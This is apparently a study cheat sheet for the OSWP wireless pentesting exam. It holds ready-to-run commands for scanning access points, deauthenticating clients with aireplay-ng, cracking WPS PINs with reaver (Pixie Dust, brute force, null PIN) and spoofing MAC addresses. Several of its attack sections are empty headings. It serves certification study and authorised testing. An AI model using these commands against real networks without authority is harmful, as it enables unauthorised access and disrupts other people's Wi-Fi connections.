# OSWP cheat sheets

This cheat sheet based on "WiFi Hacking Mind Map - v1.0 by Jérémy Brun-Nouvion (https://github.com/koutto)"

## Monitoring
### Find all AP and connected devices
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band>
```

### Monitor target AP
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w res
```
### Unhide ESSID
Set channel
```
iwconfig wlan0 channel <channel>
```
Catch beacon with ESSID
```
aireplay-ng -0 <deauth number> -a <AP MAC> <interface> 
aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
```


## WEP attack


## WPS attack
**Dependencies:** reaver

Some APs have protections to frustrate WPS attacks. AP might timeout for 60 seconds after a series of failures, or it may exponentially increase the time before the next try. These APs then require either a timeout or a reset to remove the lock. Over the next few years, a few tools managed to get around the issue by figuring out the algorithm used to generate the default PIN of various APs.
The PixieWPS3 attack, disclosed in 2014, takes advantage of the weak random number generator used in a few chipsets, which means not all WPS implementations are vulnerable. As opposed to the brute force technique, this technique requires minimal interaction with the AP to gather the data needed for the attack, which is then brute forced offline. The current version of reaver, which has been forked from the original and subsequently improved on, integrates the PixieWPS attack.

### Custom PIN association 
 
### Pixie Dust attack 
```
 reaver -i <interface> -b <AP_MAC> -K
```
 
### Bruteforce PIN attack 
```
sudo reaver -i <interface> -b <AP_MAC>
```
 
### Known PINs attack
```
reaver -i <interface> -b <AP_MAC> -p <PIN>
```
 
### Null PIN attack 
_Only a very few APs are vulnerable to this attack_
```
reaver -i <interface> -b <AP_MAC> -p "" -N
```

## WPA attack


## WPA Enterprise



## Connect to AP

### Open
```
iw <interface> connect <ESSID>
dhclient <interface>
```

### WEP
```
iw <interface> connect <ESSID> key 0:<key>
dhclient <interface>
```

### WPA2

Dependencies: wpasupplicant
```

wpa_passphrase "<ESSID>" <key> | sudo tee /etc/wpa_supplicant.conf
wpa_supplicant -B -c /etc/wpa_supplicant.conf -i <interface>
dhclient <interface>
```

### WPA enterprise

```
sudo dhclient <interface>
```

## Other
### MAC-spoofing
```
ip link set dev <interface> down
ip link set dev <interface> address <XX:XX:XX:XX:XX:XX>
ip link set dev <interface> up
```
### Prepare Attacker PC (Monitor mode)
```
airmon-ng check kill
airmon-ng start <interface>
```
### Back to normal modee (Managed mode)
```
airmon-ng stop <Monitor interface>
systemctl start wpa_supplicant
systemctl start NetworkManager
```
